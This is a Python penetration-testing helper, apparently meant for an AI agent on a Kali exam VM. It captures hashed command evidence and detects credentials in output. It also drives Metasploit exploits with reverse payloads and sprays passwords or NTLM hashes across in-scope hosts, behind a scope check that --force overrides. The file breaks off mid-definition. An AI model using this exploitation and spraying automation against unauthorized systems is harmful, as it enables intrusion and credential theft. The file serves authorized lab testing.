#!/usr/bin/env python3
"""Auto-evidence capture: runs commands locally or on remote targets (SSH/WinRM),
saves timestamped output, hashes it, auto-detects credentials and network interfaces
in the output, and optionally takes a screenshot. Designed for exam-day automation
on a Kali VM with VPN lab access."""
import argparse
import datetime
import hashlib
import ipaddress
import json
import os
import re
import subprocess
import sys

# Import Kali helpers (same directory)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from kali import run_remote, find_tool, get_vpn_interface
except ImportError:
    run_remote = None
    find_tool = lambda x: x
    get_vpn_interface = lambda: (None, None)

ENG = os.environ.get("HANES_ENGAGEMENT", "engagement")
EVIDENCE = os.path.join(ENG, "evidence")
CREDS_CSV = os.path.join(ENG, "credentials.csv")
SESSION_FILE = os.path.join(ENG, ".session_start")
SCOPE_FILE = os.path.join(ENG, "scope.txt")
JOBS_DIR = os.path.join(ENG, ".jobs")
COMMANDS_DIR = os.path.join(EVIDENCE, "commands")


# ---------------------------------------------------------------------------
# Scope enforcement — the authorization hard-gate, in code (CLAUDE.md §1)
# ---------------------------------------------------------------------------
def _scope_networks():
    """Return list of ipaddress networks currently in scope."""
    nets = []
    if not os.path.exists(SCOPE_FILE):
        return nets
    with open(SCOPE_FILE) as f:
        for line in f:
            line = line.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            entry = line.split("\t", 1)[0].strip()
            try:
                nets.append(ipaddress.ip_network(entry, strict=False))
            except ValueError:
                continue
    return nets


def _targets_from(target):
    """Expand a scan/command target into candidate addresses to scope-check.
    Handles single IP, CIDR, and dashed ranges (10.0.0.1-50)."""
    target = target.strip()
    m = re.match(r"^(\d+\.\d+\.\d+)\.(\d+)-(\d+)$", target)
    if m:
        base, lo, hi = m.group(1), int(m.group(2)), int(m.group(3))
        return [ipaddress.ip_address(f"{base}.{n}") for n in range(lo, hi + 1)]
    try:
        net = ipaddress.ip_network(target, strict=False)
        return [net]
    except ValueError:
        try:
            return [ipaddress.ip_address(target)]
        except ValueError:
            return None  # not an IP (hostname) — cannot verify


def scope_allows(target):
    """Return (ok, reason). ok=True if every address in target is in scope."""
    nets = _scope_networks()
    if not nets:
        return False, "scope is empty — add authorized targets first: bin/cpent scope <ip>"
    items = _targets_from(target)
    if items is None:
        return None, f"cannot verify scope for non-IP target '{target}'"
    for item in items:
        covered = False
        for net in nets:
            if isinstance(item, (ipaddress.IPv4Network, ipaddress.IPv6Network)):
                if item.version == net.version and item.subnet_of(net):
                    covered = True
                    break
            else:
                if item in net:
                    covered = True
                    break
        if not covered:
            return False, f"{item} is NOT in scope"
    return True, "in scope"


def enforce_scope(target, force=False):
    """Gate an outward-facing action on scope. Exits non-zero if out of scope."""
    ok, reason = scope_allows(target)
    if ok:
        return
    if ok is None:  # hostname target — warn but allow with a clear note
        print(f"[scope] WARNING: {reason}. Confirm this host is authorized.", file=sys.stderr)
        return
    if force:
        print(f"[scope] OVERRIDE (--force): {reason}. Operator asserts authorization.",
              file=sys.stderr)
        return
    sys.exit(f"[scope] BLOCKED: {reason}\n"
             f"        Add it with: bin/cpent scope {target}\n"
             f"        Or override for an authorized host with: --force")


def _ts():
    return datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def _ts_human():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _session_folder():
    """Return the current session's evidence folder (named by session start time).
    Falls back to a timestamped folder if no session is active."""
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE) as f:
            start = f.read().strip()
        folder_name = start.replace(":", "-").replace("T", "_")[:19]
    else:
        folder_name = _ts()
    return os.path.join(EVIDENCE, folder_name)


def _ensure_dirs(ip=None):
    session_dir = _session_folder()
    os.makedirs(session_dir, exist_ok=True)
    if ip:
        os.makedirs(os.path.join(ENG, "targets", ip), exist_ok=True)
    return session_dir


def _sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()


def _detect_creds(text):
    """Scan output for high-confidence credential material. Returns list of dicts.

    Deliberately conservative — a bare 32-hex string matches too many benign values
    (nmap fingerprints, cert thumbprints, cache IDs) and floods the alert, so it is
    NOT used. Only structured, credential-shaped patterns are flagged."""
    found = []
    patterns = [
        # user:password where a password keyword is explicitly present
        (r"(?i)(?:^|\s)(?:pass(?:word)?|pwd|passwd)\s*[:=]\s*(\S+)", "password"),
        # secretsdump / hashdump:  user:rid:LM:NTLM:::
        (r"(?m)^(\S+?):\d+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::", "ntlm_hashdump"),
        # Kerberos roast hashes
        (r"(\$krb5(?:tgs|asrep)\$[^\s'\"]+)", "kerberos_hash"),
        # Bare NTLM hash only when prefixed by an NTLM-ish keyword (avoids noise)
        (r"(?i)(?:ntlm|nt hash|hash)\s*[:=]\s*([a-fA-F0-9]{32})\b", "ntlm_hash"),
        # Private keys
        (r"(-----BEGIN (?:RSA |OPENSSH |EC |DSA )?PRIVATE KEY-----)", "private_key"),
        # AWS-style access keys
        (r"\b(AKIA[0-9A-Z]{16})\b", "aws_key"),
    ]
    seen = set()
    for pat, kind in patterns:
        for m in re.finditer(pat, text):
            match = m.group(0).strip()
            key = (kind, match)
            if key in seen:
                continue
            seen.add(key)
            found.append({"kind": kind, "match": match,
                          "line": match if "\n" not in match else match.splitlines()[0]})
    return found


def _detect_interfaces(text):
    """Scan for network interfaces / dual-NIC indicators (IPv4 and IPv6).
    Loopback and link-local are ignored so they don't fake a second NIC."""
    found = []
    # Linux: inet / inet6 from `ip a`
    for m in re.finditer(r"inet\s+(\d+\.\d+\.\d+\.\d+)/\d+", text):
        ip = m.group(1)
        if not ip.startswith("127."):
            found.append(ip)
    for m in re.finditer(r"inet6\s+([0-9a-fA-F:]+)/\d+", text):
        ip = m.group(1)
        if not (ip == "::1" or ip.lower().startswith("fe80")):
            found.append(ip)
    # Windows: IPv4/IPv6 Address from ipconfig
    for m in re.finditer(r"IPv4 Address[.\s]*:\s*(\d+\.\d+\.\d+\.\d+)", text):
        if not m.group(1).startswith("127."):
            found.append(m.group(1))
    for m in re.finditer(r"IPv6 Address[.\s]*:\s*([0-9a-fA-F:]+)", text):
        ip = m.group(1)
        if not (ip == "::1" or ip.lower().startswith("fe80")):
            found.append(ip)
    # Dedupe, preserve order
    seen, uniq = set(), []
    for ip in found:
        if ip not in seen:
            seen.add(ip)
            uniq.append(ip)
    return uniq


def _detect_proof(text):
    """Extract proof-of-access markers from output, line-accurately."""
    markers = {}
    # Linux `id`:  uid=0(root) gid=0(root) ...
    m = re.search(r"(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^\n]*)", text)
    if m:
        markers["id"] = m.group(1).strip()
    # Windows whoami:  domain\user  (on its own line, after a whoami invocation)
    m = re.search(r"(?mi)^((?:[A-Za-z0-9.-]+\\)[A-Za-z0-9$._-]+)\s*$", text)
    if m:
        markers["whoami"] = m.group(1).strip()
    # Generic "nt authority\system" / "root" confirmation
    if re.search(r"(?i)nt authority\\system", text):
        markers["privilege"] = "NT AUTHORITY\\SYSTEM"
    elif re.search(r"(?m)^root$", text) or markers.get("id", "").startswith("uid=0"):
        markers["privilege"] = "root"
    # hostname / computer name
    m = re.search(r"(?i)(?:^|\n)\s*(?:hostname|computer\s*name)[.\s]*:?\s*(\S+)", text)
    if m:
        markers["hostname"] = m.group(1)
    return markers


def _has_display():
    """True if an X/Wayland display is reachable (screenshots are impossible without one)."""
    return bool(os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"))


def take_screenshot(target_ip, label="", output_dir=None):
    """Take a screenshot with timestamp and target IP overlay.
    Returns (None, None) cleanly on headless hosts — the saved text file remains the
    primary evidence, and the operator is reminded to screenshot manually."""
    if not _has_display():
        print("[screenshot] no display (headless/SSH session) — skipping desktop capture.",
              file=sys.stderr)
        print("[screenshot] TEXT evidence is saved and hashed; take a manual screenshot "
              "(IP + timestamp visible) from the GUI session for the report.", file=sys.stderr)
        return None, None

    ts = _ts()
    session_dir = _session_folder()
    out_dir = output_dir or session_dir
    os.makedirs(out_dir, exist_ok=True)
    slug = re.sub(r"[^a-z0-9]+", "-", label.lower()).strip("-") if label else "screen"
    filename = f"{ts}_{target_ip}_{slug}.png"
    filepath = os.path.join(out_dir, filename)

    # Try multiple screenshot tools (exam VM may have any of these)
    tools = [
        # scrot (common on Kali)
        ["scrot", filepath],
        # import from ImageMagick
        ["import", "-window", "root", filepath],
        # gnome-screenshot
        ["gnome-screenshot", "-f", filepath],
        # xfce4-screenshooter
        ["xfce4-screenshooter", "-f", "-s", filepath],
        # maim
        ["maim", filepath],
    ]

    for cmd in tools:
        try:
            subprocess.run(cmd, capture_output=True, timeout=10)
            if os.path.exists(filepath):
                sha = _sha256(filepath)
                # Annotate with IP + timestamp if convert (ImageMagick) is available
                try:
                    annotation = f"{target_ip} | {_ts_human()}"
                    subprocess.run([
                        "convert", filepath,
                        "-gravity", "SouthEast",
                        "-pointsize", "18",
                        "-fill", "yellow",
                        "-undercolor", "black",
                        "-annotate", "+10+10", annotation,
                        filepath,
                    ], capture_output=True, timeout=10)
                except Exception:
                    pass  # annotation is nice-to-have
                print(f"SCREENSHOT: {filepath}")
                print(f"  sha256: {sha}")
                return filepath, sha
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    print("WARNING: no screenshot tool found (tried scrot, import, gnome-screenshot, "
          "xfce4-screenshooter, maim). Take manually.", file=sys.stderr)
    return None, None


# Fonts to try for the rendered-output image, in order (first that exists wins).
_MONO_FONTS = [
    "DejaVu-Sans-Mono", "DejaVuSansMono", "Liberation-Mono",
    "FreeMono", "Courier-New", "Courier",
]
_MAX_IMG_LINES = 80          # cap rendered lines so one scan doesn't make a giant PNG
_MAX_IMG_COLS = 160          # wrap/truncate very long lines


def render_output_image(target_ip, cmd_str, output, label="", output_dir=None):
    """Render the command and its OUTPUT into an annotated PNG — the evidence screenshot
    comes from the tool itself (nmap/whoami/etc.), not a desktop grab. Works headless.
    Needs ImageMagick `convert`; returns (path, sha) or (None, None)."""
    if not _sh_which("convert"):
        print("[evidence-img] ImageMagick 'convert' not found — install imagemagick to "
              "render tool-output screenshots (text evidence is still saved).", file=sys.stderr)
        return None, None

    ts = _ts()
    session_dir = _session_folder()
    out_dir = output_dir or session_dir
    os.makedirs(out_dir, exist_ok=True)
    slug = re.sub(r"[^a-z0-9]+", "-", (label or cmd_str.split()[0]).lower()).strip("-")[:40]
    filepath = os.path.join(out_dir, f"{ts}_{target_ip}_{slug}.png")

    # Build the text block: IP+timestamp banner, the command, then its output.
    banner = f"=== EVIDENCE  {target_ip}  |  {_ts_human()} ==="
    lines = [banner, f"$ {cmd_str}", ""]
    out_lines = output.splitlines()
    truncated = False
    if len(out_lines) > _MAX_IMG_LINES:
        out_lines = out_lines[:_MAX_IMG_LINES]
        truncated = True
    for ln in out_lines:
        lines.append(ln[:_MAX_IMG_COLS] + (" …" if len(ln) > _MAX_IMG_COLS else ""))
    if truncated:
        lines.append(f"... [output truncated to {_MAX_IMG_LINES} lines — full text + "
                     f"sha256 in the evidence .txt] ...")
    lines += ["", banner]
    text = "\n".join(lines)

    # Render with an INLINE `label:` (Kali/Debian ImageMagick policy blocks reading text
    # from @file, so the text is passed directly as the argument).
    font = next((ft for ft in _MONO_FONTS if _font_available(ft)), None)
    base = ["convert", "-background", "#0b0e14", "-fill", "#c8d3e0",
            "-pointsize", "15", "-bordercolor", "#0b0e14", "-border", "16"]

    def _run(with_font):
        cmd = list(base)
        if with_font and font:
            cmd += ["-font", font]
        cmd += [f"label:{text}", filepath]
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=30)
            return r.returncode == 0 and os.path.exists(filepath)
        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
            print(f"[evidence-img] render failed: {e}", file=sys.stderr)
            return False

    if not _run(with_font=True):
        _run(with_font=False)   # retry with default font if the named one was rejected

    if not os.path.exists(filepath):
        print("[evidence-img] render produced no file (check ImageMagick policy).",
              file=sys.stderr)
        return None, None
    sha = _sha256(filepath)
    print(f"SCREENSHOT (tool output): {filepath}")
    print(f"  sha256: {sha}")
    return filepath, sha


def _sh_which(name):
    import shutil as _sh
    return _sh.which(name)


_FONT_CACHE = {}


def _font_available(font):
    """Check `convert -list font` once for a font name."""
    if not _FONT_CACHE:
        try:
            out = subprocess.run(["convert", "-list", "font"], capture_output=True,
                                 text=True, timeout=10).stdout
            for m in re.finditer(r"Font:\s*(\S+)", out):
                _FONT_CACHE[m.group(1)] = True
        except Exception:
            _FONT_CACHE["__failed__"] = True
    return font in _FONT_CACHE


def _safe_unlink(path):
    try:
        os.remove(path)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Command journal — a running, per-tool log of the CLI commands used in the
# engagement, built under engagement/evidence/commands/ as progress is made.
# Feeds the report's "Command log" appendix and lets the operator re-run the chain.
# ---------------------------------------------------------------------------
_TOOL_PREFIXES = {"sudo", "proxychains", "proxychains4", "-q", "time", "nohup", "stdbuf"}


def _tool_name(cmd_str):
    """Best-effort extraction of the primary tool from a command string."""
    toks = cmd_str.strip().split()
    i = 0
    while i < len(toks):
        t = toks[i]
        if "=" in t and not t.startswith("-") and "/" not in t.split("=")[0]:
            i += 1              # skip leading VAR=value env assignments
            continue
        if t in _TOOL_PREFIXES:
            i += 1              # skip wrappers (sudo, proxychains, -q, ...)
            continue
        break
    if i >= len(toks):
        return "misc"
    tool = os.path.basename(toks[i])
    # sanitise for a filename
    tool = re.sub(r"[^A-Za-z0-9._-]", "", tool) or "misc"
    return tool.lower()


def _log_command(cmd_str, target_ip, zone, retcode):
    """Append a command to the chronological timeline and its per-tool file."""
    try:
        os.makedirs(COMMANDS_DIR, exist_ok=True)
        ts = _ts_human()
        status = "ok" if retcode in (0, None) else f"exit={retcode}"
        tool = _tool_name(cmd_str)

        # 1) chronological timeline — every command, in order
        timeline = os.path.join(COMMANDS_DIR, "_timeline.md")
        new = not os.path.exists(timeline)
        with open(timeline, "a") as f:
            if new:
                f.write("# Command timeline\n\n"
                        "Every command run through the evidence engine, in order.\n\n")
            f.write(f"- `{ts}` [{zone or '-'}] **{target_ip}** ({status}) — `{cmd_str}`\n")

        # 2) per-tool file — distinct commands for that tool (deduped)
        tool_file = os.path.join(COMMANDS_DIR, f"{tool}.md")
        existing = ""
        if os.path.exists(tool_file):
            with open(tool_file) as f:
                existing = f.read()
        else:
            existing = f"# {tool} — commands used\n\n"
            with open(tool_file, "w") as f:
                f.write(existing)
        # dedupe on the exact command string (same string = same command)
        if f"`{cmd_str}`" not in existing:
            with open(tool_file, "a") as f:
                f.write(f"- `{ts}` **{target_ip}** ({status}) — `{cmd_str}`\n")
    except OSError:
        pass  # journaling must never break a capture


def capture_command(cmd_str, target_ip, zone="", label="", screenshot=True,
                    remote_method=None, remote_user=None, remote_secret=None,
                    timeout=300):
    """Run a command (locally or on a remote target), capture output as evidence,
    auto-detect creds/interfaces. Screenshots are taken by default for every capture."""
    session_dir = _ensure_dirs(target_ip)
    ts = _ts()
    slug = re.sub(r"[^a-z0-9]+", "-", (label or cmd_str.split()[0]).lower()).strip("-")[:40]
    evidence_file = os.path.join(ENG, "targets", target_ip, f"{ts}_{slug}.txt")
    session_copy = os.path.join(session_dir, f"{ts}_{target_ip}_{slug}.txt")

    exec_mode = f"remote ({remote_method})" if remote_method else "local"

    # Header
    header = (f"{'='*72}\n"
              f"TARGET: {target_ip}\n"
              f"TIME:   {_ts_human()}\n"
              f"ZONE:   {zone}\n"
              f"EXEC:   {exec_mode}\n"
              f"CMD:    {cmd_str}\n"
              f"{'='*72}\n\n")

    # Run the command
    print(f"[evidence] running ({exec_mode}): {cmd_str}")

    if remote_method and run_remote:
        # Execute on the remote target
        stdout, stderr, retcode = run_remote(
            target_ip, remote_user, remote_secret, cmd_str, method=remote_method
        )
        output = stdout
        if stderr:
            output += f"\n--- STDERR ---\n{stderr}"
    elif remote_method and not run_remote:
        output = "(remote execution unavailable: kali.py not found)"
        retcode = -1
    else:
        # Local execution
        try:
            proc = subprocess.run(
                cmd_str, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = proc.stdout
            if proc.stderr:
                output += f"\n--- STDERR ---\n{proc.stderr}"
            retcode = proc.returncode
        except subprocess.TimeoutExpired:
            output = f"(command timed out after {timeout}s)"
            retcode = -1

    # Write evidence file (per-target)
    content = header + output + f"\n\n{'='*72}\nEXIT CODE: {retcode}\n"
    with open(evidence_file, "w") as f:
        f.write(content)

    # Also write to session-level evidence folder for chronological view
    with open(session_copy, "w") as f:
        f.write(content)

    sha = _sha256(evidence_file)
    print(f"[evidence] saved: {evidence_file}")
    print(f"[evidence] session: {session_copy}")
    print(f"[evidence] sha256: {sha}")

    # Append to the running command journal (per-tool + chronological timeline)
    _log_command(cmd_str, target_ip, zone, retcode)

    # Print the actual output so the operator sees it
    print(f"\n{output}")

    # Auto-detect credentials
    creds = _detect_creds(output)
    if creds:
        print(f"\n[auto-detect] potential credentials found ({len(creds)}):")
        for c in creds:
            print(f"  {c['kind']}: {c['match']}")
        print("  -> Review and add confirmed creds with: bin/cpent cred add ...")

    # Auto-detect network interfaces (dual-NIC hunt)
    ifaces = _detect_interfaces(output)
    if len(ifaces) > 1:
        print(f"\n[auto-detect] DUAL-NIC / MULTIPLE INTERFACES on {target_ip}:")
        for iface in ifaces:
            print(f"  {iface}")
        print("  -> This host is a PIVOT candidate! Update network map and load pivoting skill.")
    elif ifaces:
        print(f"\n[auto-detect] interface: {ifaces[0]}")

    # Auto-detect proof of access
    proof = _detect_proof(output)
    if proof:
        print(f"\n[auto-detect] proof of access: {proof}")

    # Evidence image: render the TOOL'S OWN OUTPUT (nmap/whoami/etc.) into an annotated
    # PNG — this is the screenshot that proves the result, works headless, and always
    # contains the actual output. Desktop grabs are reserved for GUI apps via
    # `bin/cpent screenshot`. Saved to both the session folder and the per-target folder,
    # mirroring the text evidence.
    if screenshot:
        img_path, _ = render_output_image(target_ip, cmd_str, output, label or slug)
        if img_path and target_ip not in ("scope-spray",):
            try:
                import shutil as _sh
                _sh.copy2(img_path, os.path.join(ENG, "targets", target_ip,
                                                  os.path.basename(img_path)))
            except OSError:
                pass

    return evidence_file, sha, output


# ---------------------------------------------------------------------------
# Background job runner — honours CLAUDE.md §3 "background long-running jobs"
# ---------------------------------------------------------------------------
def _job_meta_path(jobid):
    return os.path.join(JOBS_DIR, f"{jobid}.json")


def _write_job_meta(jobid, meta):
    os.makedirs(JOBS_DIR, exist_ok=True)
    tmp = _job_meta_path(jobid) + ".tmp"
    with open(tmp, "w") as f:
        json.dump(meta, f, indent=2)
    os.replace(tmp, _job_meta_path(jobid))


def run_in_background(label, target_ip, func, *args, **kwargs):
    """Fork a detached child to run func(*args). Parent returns a job id immediately.
    The child records status/exit so `jobs` can report completion. Linux (Kali) only."""
    os.makedirs(JOBS_DIR, exist_ok=True)
    jobid = f"{_ts()}_{re.sub(r'[^a-z0-9]+', '-', (label or 'job').lower()).strip('-')[:30]}"
    logpath = os.path.join(JOBS_DIR, f"{jobid}.log")
    meta = {"id": jobid, "label": label, "target": target_ip, "status": "running",
            "started": _ts_human(), "finished": None, "exit": None, "log": logpath}
    _write_job_meta(jobid, meta)

    try:
        pid = os.fork()
    except OSError as e:
        sys.exit(f"[jobs] cannot fork background job: {e}")

    if pid > 0:
        meta["pid"] = pid
        _write_job_meta(jobid, meta)
        print(f"[jobs] started background job: {jobid} (pid {pid})")
        print(f"[jobs] watch:  bin/cpent ev-jobs           # list status")
        print(f"[jobs] output: {logpath}")
        return jobid

    # --- child ---
    os.setsid()
    with open(logpath, "w") as logf:
        os.dup2(logf.fileno(), sys.stdout.fileno())
        os.dup2(logf.fileno(), sys.stderr.fileno())
        rc = 0
        try:
            func(*args, **kwargs)
        except SystemExit as e:
            rc = e.code if isinstance(e.code, int) else 1
        except Exception as e:  # noqa: BLE001 — record any failure for the operator
            print(f"[jobs] job raised: {e}")
            rc = 1
        meta["status"] = "done"
        meta["finished"] = _ts_human()
        meta["exit"] = rc
        _write_job_meta(jobid, meta)
    os._exit(0)


def _pid_alive(pid):
    if not pid:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def list_jobs(args):
    """Print the status of all background jobs."""
    if not os.path.isdir(JOBS_DIR):
        print("(no background jobs)")
        return
    metas = []
    for fn in sorted(os.listdir(JOBS_DIR)):
        if not fn.endswith(".json"):
            continue
        try:
            meta = json.load(open(os.path.join(JOBS_DIR, fn)))
        except (ValueError, OSError):
            continue
        # Reconcile: a "running" job whose pid is gone but never recorded done = crashed
        if meta.get("status") == "running" and not _pid_alive(meta.get("pid")):
            meta["status"] = "ended"
        metas.append(meta)
    if not metas:
        print("(no background jobs)")
        return
    print(f"{'STATUS':<9} {'JOB':<40} {'TARGET':<16} STARTED")
    for m in metas:
        print(f"{m.get('status',''):<9} {m.get('id',''):<40} "
              f"{m.get('target',''):<16} {m.get('started','')}")
        if m.get("status") == "done" and m.get("exit") not in (0, None):
            print(f"          exit={m['exit']}  (see {m.get('log','')})")
    print("\nTail a job's output:  tail -f <log path above>")


# ---------------------------------------------------------------------------
# Credential spray — the highest-ROI exam move: test one cred against all scope
# ---------------------------------------------------------------------------
def _scope_targets_str():
    """All in-scope entries as a space-joined string for a spray tool."""
    nets = _scope_networks()
    out = []
    for n in nets:
        # /32 and /128 → bare host; otherwise the CIDR itself (nxc expands it)
        if n.prefixlen in (32, 128):
            out.append(str(n.network_address))
        else:
            out.append(str(n))
    return " ".join(out)


def show_commands(args):
    """Print the command journal so the operator can review/replay the chain so far."""
    if not os.path.isdir(COMMANDS_DIR):
        print("(no commands journaled yet — run commands through `bin/cpent ev`)")
        return
    tool_files = sorted(f for f in os.listdir(COMMANDS_DIR)
                        if f.endswith(".md") and not f.startswith("_"))

    if args.list:
        print(f"journaled tools ({len(tool_files)}):")
        for f in tool_files:
            n = sum(1 for l in open(os.path.join(COMMANDS_DIR, f)) if l.startswith("- "))
            print(f"  {f[:-3]:<20} {n} distinct command(s)")
        print("\nShow one:  bin/cpent commands <tool>   |   all:  bin/cpent commands")
        return

    if args.tool:
        # match <tool> or <tool>.md, case-insensitive
        want = args.tool.lower().removesuffix(".md")
        match = next((f for f in tool_files if f[:-3].lower() == want), None)
        if not match:
            print(f"no journal for '{args.tool}'. Available: "
                  f"{', '.join(f[:-3] for f in tool_files) or '(none)'}")
            return
        print(open(os.path.join(COMMANDS_DIR, match)).read())
        return

    # default: the chronological timeline
    timeline = os.path.join(COMMANDS_DIR, "_timeline.md")
    if os.path.exists(timeline):
        print(open(timeline).read())
        print(f"\nPer-tool files: {', '.join(f[:-3] for f in tool_files)}  "
              f"(bin/cpent commands <tool>)")
    else:
        print("(timeline empty)")


def _msf_run_console(cmdline, target_ip, label, background, timeout=1800):
    """Run msfconsole non-interactively (-x) and capture as evidence.
    cmdline must not contain single quotes (we wrap -x in single quotes)."""
    full = f"msfconsole -q -x '{cmdline}'"
    print(f"[msf] {full}")
    if background:
        run_in_background(label, target_ip, capture_command, full, target_ip,
                          "network-system", label, timeout=timeout)
    else:
        capture_command(full, target_ip, "network-system", label, timeout=timeout)


def run_msf(args):
    """Drive Metasploit non-interactively: search / run / check / rc — so the agent can
    fire a whole exploit in one shot instead of sitting in the msfconsole REPL."""
    action = args.msfaction

    if action == "search":
        terms = " ".join([t for t in ([args.module] + args.query) if t]).strip()
        if not terms:
            sys.exit("usage: cpent msf search <term> [term2 ...]   e.g. msf search cve:2021-34527")
        # sanitise single quotes out of the query (we wrap -x in single quotes)
        terms = terms.replace("'", "")
        cmdline = f"search {terms}; exit"
        _msf_run_console(cmdline, "msf-search", f"msf-search-{terms.split()[0]}"[:40],
                         args.background, timeout=300)
        return

    # run / check / rc all touch a target → scope-gated
    if not args.ip:
        sys.exit(f"[msf] --ip <target> is required for '{action}'")
    enforce_scope(args.ip, force=args.force)

    if action == "rc":
        rc_path = args.module
        if not rc_path or not os.path.exists(rc_path):
            sys.exit(f"[msf] resource script not found: {rc_path}")
        full = f"msfconsole -q -r {rc_path}"
        label = f"msf-rc-{os.path.basename(rc_path)}"[:40]
        if args.background:
            run_in_background(label, args.ip, capture_command, full, args.ip,
                              "network-system", label, timeout=1800)
        else:
            capture_command(full, args.ip, "network-system", label, timeout=1800)
        return

    module = args.module
    if not module:
        sys.exit(f"[msf] module is required: cpent msf {action} <module> --ip <ip> ...")
    module = module.replace("'", "")

    parts = [f"use {module}", f"set RHOSTS {args.ip}"]
    for kv in (args.opt or []):
        if "=" not in kv:
            sys.exit(f"[msf] bad -o option (want KEY=VALUE): {kv}")
        k, v = kv.split("=", 1)
        parts.append(f"set {k} {v.replace(chr(39), '')}")

    if action == "check":
        parts += ["check", "exit -y"]
        _msf_run_console("; ".join(parts), args.ip,
                         f"msf-check-{module.split('/')[-1]}"[:40], args.background, timeout=600)
        return

    # action == run (exploit)
    if args.payload:
        parts.append(f"set PAYLOAD {args.payload}")
    # LHOST: explicit, or auto-detect the VPN/tun interface for reverse payloads
    lhost = args.lhost
    if lhost in (None, "auto"):
        _, tun_ip = get_vpn_interface()
        if tun_ip:
            lhost = tun_ip
            print(f"[msf] LHOST auto-detected (tun): {lhost}")
        elif args.lhost == "auto":
            sys.exit("[msf] --lhost auto but no tun/tap interface found — pass --lhost <ip>")
    if lhost:
        parts.append(f"set LHOST {lhost}")
    if args.lport:
        parts.append(f"set LPORT {args.lport}")

    parts.append("set ExitOnSession false")
    parts.append("exploit -z")          # run, background any session, don't drop into it
    parts.append("sessions -l")          # show sessions created (evidence)
    proof = (args.proof or "").replace("'", "")
    if proof:
        parts.append(f'sessions -C "{proof}"')   # run a proof cmd on shell sessions
    parts.append("exit -y")

    _msf_run_console("; ".join(parts), args.ip,
                     f"msf-exploit-{module.split('/')[-1]}"[:40], args.background, timeout=1800)


def run_spray(args):
    """Spray a single credential across every in-scope host via netexec/crackmapexec."""
    targets = _scope_targets_str()
    if not targets:
        sys.exit("[spray] scope is empty — add authorized targets first: bin/cpent scope <ip>")
    if not (args.passwd or args.nthash):
        sys.exit("[spray] need --pass <password> or --hash <ntlm>")

    # Prefer netexec (nxc); fall back to crackmapexec
    import shutil as _sh
    tool = "nxc" if _sh.which("nxc") else ("crackmapexec" if _sh.which("crackmapexec") else "nxc")

    user_part = f"-u '{args.user}'"
    secret_part = f"-H '{args.nthash}'" if args.nthash else f"-p '{args.passwd}'"
    extra = " --local-auth" if args.local_auth else ""
    # --continue-on-success so one valid cred doesn't stop the sweep
    cmd = f"{tool} {args.proto} {targets} {user_part} {secret_part}{extra} --continue-on-success"

    print(f"[spray] {args.proto.upper()} spray of '{args.user}' across scope "
          f"({len(_scope_networks())} range(s))")
    print(f"[spray] command: {cmd}")
    label = f"spray-{args.proto}-{re.sub(r'[^a-z0-9]+', '-', args.user.lower())}"[:40]
    if args.background:
        run_in_background(label, "scope", capture_command, cmd, "scope-spray",
                          "network-system", label, screenshot=False, timeout=1800)
    else:
        capture_command(cmd, "scope-spray", "network-system", label,
                        screenshot=False, timeout=1800)


def main():
    p = argparse.ArgumentParser(
        prog="evidence",
        description="Auto-evidence capture: run, save, hash, detect creds/interfaces"
    )
    sub = p.add_subparsers(dest="action", required=True)

    # Shared remote-execution args (added to multiple subparsers)
    def add_remote_args(parser):
        parser.add_argument("--remote", choices=["ssh", "winrm", "pth"],
                            help="Execute on the remote target via this method")
        parser.add_argument("--user", help="Remote username")
        parser.add_argument("--secret", help="Password or NTLM hash for remote auth")

    # capture: run a command and save evidence
    cap = sub.add_parser("capture", help="Run a command and save timestamped evidence")
    cap.add_argument("cmd", help="Command to run (quote it)")
    cap.add_argument("--ip", required=True, help="Target IP")
    cap.add_argument("--zone", default="", help="Exam zone")
    cap.add_argument("--label", default="", help="Short label for the evidence file")
    cap.add_argument("--no-screenshot", action="store_true", help="Skip the auto-screenshot")
    cap.add_argument("--timeout", type=int, default=300, help="Command timeout in seconds")
    cap.add_argument("--background", "--bg", action="store_true",
                     help="Run detached; returns a job id (use ev-jobs to check)")
    cap.add_argument("--force", action="store_true", help="Override scope block (authorized host)")
    add_remote_args(cap)

    # jobs: list background job status
    sub.add_parser("jobs", help="List background job status")

    # commands: view the command journal (replay the chain)
    cj = sub.add_parser("commands", help="Show the command journal (timeline or per-tool)")
    cj.add_argument("tool", nargs="?", help="Show commands for this tool (e.g. nmap)")
    cj.add_argument("--list", action="store_true", help="List journaled tools")

    # screenshot: just take a screenshot
    scr = sub.add_parser("screenshot", help="Take an annotated screenshot")
    scr.add_argument("--ip", required=True, help="Target IP to annotate")
    scr.add_argument("--label", default="", help="Label")

    # scan: run an nmap scan with auto-evidence
    scan = sub.add_parser("scan", help="Nmap scan with auto-evidence capture")
    scan.add_argument("target", help="Target IP or CIDR")
    scan.add_argument("--type", choices=["discovery", "full", "service", "vuln"],
                       default="service", help="Scan type")
    scan.add_argument("--ports", default="", help="Specific ports")
    scan.add_argument("--proxychains", action="store_true",
                       help="Run through proxychains (for pivoted targets)")
    scan.add_argument("--background", "--bg", action="store_true",
                      help="Run detached; returns a job id (use ev-jobs to check)")
    scan.add_argument("--force", action="store_true", help="Override scope block (authorized)")
    scan.add_argument("--timeout", type=int, default=1800,
                      help="Scan timeout in seconds (default 1800 — full sweeps are slow)")

    # spray: test a credential across all in-scope hosts
    spray = sub.add_parser("spray", help="Spray one credential across all in-scope hosts")
    spray.add_argument("--user", required=True, help="Username (or user list file with @)")
    spray.add_argument("--pass", dest="passwd", help="Password")
    spray.add_argument("--hash", dest="nthash", help="NTLM hash (pass-the-hash)")
    spray.add_argument("--proto", default="smb",
                       choices=["smb", "winrm", "ssh", "ldap", "rdp", "mssql", "ftp"],
